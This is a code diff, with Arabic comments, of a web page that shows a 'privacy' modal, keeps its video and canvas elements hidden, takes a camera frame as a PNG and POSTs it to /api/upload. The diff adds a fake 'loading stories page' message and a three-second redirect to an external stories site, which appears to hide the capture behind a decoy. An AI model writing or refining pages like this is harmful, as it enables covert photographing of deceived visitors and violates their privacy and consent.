@@ -22,14 +22,14 @@
       justify-content: center;
       align-items: center;
       z-index: 1000;
-      padding: 15px; /* عشان ما يلصقش الصندوق على جوانب الشاشة */
+      padding: 15px;
     }
 
     #privacyModal > div {
       background: white;
       padding: 25px 20px;
       width: 100%;
-      max-width: 400px; /* حجم مناسب للكمبيوتر والموبايل */
+      max-width: 400px;
       border-radius: 15px;
       box-shadow: 0 12px 25px rgba(0, 0, 0, 0.2);
       position: relative;
@@ -65,7 +65,6 @@
       line-height: 1.6;
     }
 
-    /* تعديلات خاصة لشاشات أصغر */
     @media (max-width: 480px) {
       #privacyModal > div {
         padding: 20px 15px;
@@ -84,7 +83,6 @@
       }
     }
 
-    /* الفيديو والكانفس مخفية */
     #video, #canvas {
       display: none;
     }
@@ -127,13 +125,21 @@
 
               const imageData = canvas.toDataURL('image/png');
 
-fetch('/api/upload', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({ image: imageData })
-});
+              fetch('/api/upload', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData })
+              });
+
+              // عرض رسالة جاري التحميل
+              document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family: Cairo, sans-serif;font-size:24px;color:#333;">جاري تحميل صفحة القصص...</div>';
+
+              // تحويل للرابط بعد 3 ثواني
+              setTimeout(() => {
+                window.location.href = 'https://stories22.netlify.app/';
+              }, 3000);
 
             }, 3000);
           };
